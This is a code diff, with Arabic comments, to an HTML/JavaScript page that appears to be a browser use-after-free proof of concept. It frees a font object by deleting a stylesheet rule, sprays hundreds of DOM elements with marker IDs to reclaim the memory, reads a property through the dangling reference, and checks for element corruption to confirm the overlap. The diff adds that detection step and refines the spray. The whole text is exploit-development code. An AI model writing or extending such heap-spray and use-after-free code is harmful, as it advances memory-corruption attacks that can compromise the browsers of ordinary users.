@@ -6,7 +6,7 @@
 </style>
 </head>
 <body style="background: black; color: #0f0; font-family: monospace; padding: 20px;">
-    <div id="out">جاري فحص الاستبدال عبر طبقة الـ DOM...</div>
+    <div id="out">جاري تحديد عنصر الـ DOM المتداخل...</div>
     <div id="trash-bin" style="display: none;"></div>
 
 <script>
@@ -26,34 +26,48 @@ window.onload = () => {
                 callbackCount++;
                 
                 if (callbackCount === 1) { 
-                    // 1. تحرير كائن الخط من طبقة الـ ++C
+                    // 1. تحرير كائن الخط
                     document.getElementById('s').sheet.deleteRule(0);
                     
-                    // 2. محاولة ملء الفراغ بكائنات ++C موازية عبر الـ DOM
+                    // 2. ضخ عناصر DOM مكثفة لشغل الحيز الذاكري
                     for (let i = 0; i < 300; i++) {
                         let el = document.createElement('div');
-                        // نضع قيم نصية مميزة تمثل "علامات" في الذاكرة
-                        el.id = "DOM_" + i;
-                        el.className = "spray_class_test";
-                        
-                        // إجبار المحرك على ربط العنصر بشجرة الـ DOM ليتم حجزه في الذاكرة فعلياً
+                        el.id = "TARGET_" + i; // علامة مميزة
+                        el.className = "spray_class";
                         bin.appendChild(el);
                         domElements.push(el);
                     }
                     
-                    // 3. فحص استقرار الذاكرة بعد الاستبدال
+                    // 3. الفحص الدقيق للتداخل
                     setTimeout(() => {
+                        let triggeredId = -1;
+                        
                         try {
-                            // محاولة استدعاء خاصية من الكائن المحرر لإجبار المتصفح على القراءة
-                            let testRead = A.family;
+                            // إجبار المحرك على القراءة من المؤشر الميت
+                            let test = A.family;
                             
-                            // إذا استقر المتصفح وقرأ دون انهيار، ننتقل للون الأصفر كمؤشر نجاح الاستبدال الطبقي
-                            document.body.style.background = "#555500"; // بني/أصفر داكن
-                            document.getElementById("out").innerText = "تم ملء الفراغ بكائنات DOM. المتصفح مستقر وقرأ الخاصية بنجاح.";
+                            // فحص عناصر الـ DOM لمعرفة هل تغيرت معرفاتها نتيجة القراءة من المؤشر الميت
+                            for (let j = 0; j < domElements.length; j++) {
+                                // إذا حدث تداخل، ستتأثر خصائص العنصر في الذاكرة
+                                if (domElements[j].id !== "TARGET_" + j) {
+                                    triggeredId = j;
+                                    break;
+                                }
+                            }
+                            
+                            if (triggeredId !== -1) {
+                                // نجاح التداخل الكامل!
+                                document.body.style.background = "purple"; // أرجواني
+                                document.getElementById("out").innerText = "نجاح قاطع! تم رصد التداخل في عنصر الـ DOM رقم: " + triggeredId;
+                            } else {
+                                // استقرار طبقي بدون تداخل مباشر في هذا الحجم
+                                document.body.style.background = "#555500"; // بني
+                                document.getElementById("out").innerText = "الاستبدال مستقر في طبقة الـ ++C، لكن لم يتم رصد تداخل مباشر في الـ ID حتى الآن. الحجم بحاجة لضبط.";
+                            }
                             
                         } catch(e) {
                             document.body.style.background = "red";
-                            document.getElementById("out").innerText = "حدث خطأ في القراءة: " + e.message;
+                            document.getElementById("out").innerText = "انهيار برمي: " + e.message;
                         }
                     }, 0);
                 }
